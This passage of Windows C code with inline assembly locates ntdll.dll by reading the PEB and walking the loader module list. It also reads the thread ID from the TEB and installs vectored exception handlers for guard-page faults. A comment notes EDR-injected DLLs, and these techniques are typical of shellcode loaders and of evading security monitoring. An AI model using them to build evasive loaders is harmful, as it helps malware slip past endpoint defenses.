    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    //2nd: 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000;
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    
    //2nd method: 
    void *ntdllBase = NULL;
    PPEB_LDR_DATA ldr = NULL;
    PPEB pPEB = NULL;
    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;

    #ifdef _WIN64
        __asm__ volatile (
            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
            : "=r" (pPEB)
        );
    #else
        __asm__ volatile (
            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
            : "=r" (pPEB)
        );
    #endif

    // Get PEB_LDR_DATA
    ldr = pPEB->Ldr;

    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    // LIST_ENTRY* current = head->Flink;

    // while (current != head) {
    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    //     // Print the base address and name of each module
    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);

    //     // Check if the BaseDllName matches "ntdll.dll"
    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
    //         ntdllBase = dte->DllBase;
    //         break;
    //     }

    //     current = current->Flink;
    // }

    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.

    // Get the first entry (the application itself)
    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
    // Get the second entry (ntdll.dll)
    LIST_ENTRY* secondEntry = firstEntry->Flink;

    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    ntdllBase = dte->DllBase;

    // /// OR check the string name of the module:
    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
    // do {
    //     current = current->Flink; // Move to the next entry
    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    //     char dllName[256]; // Buffer to store the name of the DLL
    //     // Assuming FullDllName is a UNICODE_STRING, conversion to char* may require more than snprintf, consider proper conversion
    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
    //         return entry->DllBase; // Return the base address of ntdll.dll
    //     }
    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again


    if (ntdllBase != NULL) {
        printf("[+] Ntdll base address found: %p\n", ntdllBase);
    } else {
        printf("[-] Ntdll base address not found\n");
    }

    return (ADDR*)ntdllBase;
}

// Below function can be used inside the handler to check thread ID is correct or not
DWORD GetCurrentThreadID_TEB() {
    DWORD dwCurrentThreadID = 0;
    // Access TEB in x64 and get the current thread ID
    __asm__ __volatile__ (
        "movq %%gs:0x30, %%rax;"    // Access the TEB in x64 (gs segment for x64), x86 is fs
        "movl 0x48(%%rax), %%eax;"  // Offset for TEB->ClientId.UniqueThread, x86 is 0x24
        "movl %%eax, %0;"           // Move the thread ID to dwCurrentThreadID
        : "=r" (dwCurrentThreadID)  // output operand
        :                           // no input operand
        : "%rax", "%eax"            // clobbered registers
    );

    return dwCurrentThreadID;
}

LONG WINAPI vehExceptionHandler(PEXCEPTION_POINTERS e)
{	
    // printf("[+] Exception (VEH): 0x%0.8X\n", e->ExceptionRecord->ExceptionCode);
    if(e->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION || e->ExceptionRecord->ExceptionCode == STATUS_STACK_BUFFER_OVERRUN) {


        if(e->ExceptionRecord->ExceptionCode == 0x80000001) {
            printf("[!!!!] Page guard Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        } else if (e->ExceptionRecord->ExceptionCode == 0xC0000409) {
            printf("[+] Stack buffer overrun detected.\n");
            printf("[+] Stack buffer overrun at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        }
    }

    // e->ContextRecord->EFlags |= (1 << 8); 
    // e->ContextRecord->EFlags |= (1 << 16);
	// return EXCEPTION_CONTINUE_SEARCH;
    return EXCEPTION_CONTINUE_EXECUTION;
}

LONG WINAPI vchExceptionHandler(PEXCEPTION_POINTERS Info)
{	
    printf("[+] Exception (VCH): 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);

	return EXCEPTION_CONTINUE_EXECUTION;
}
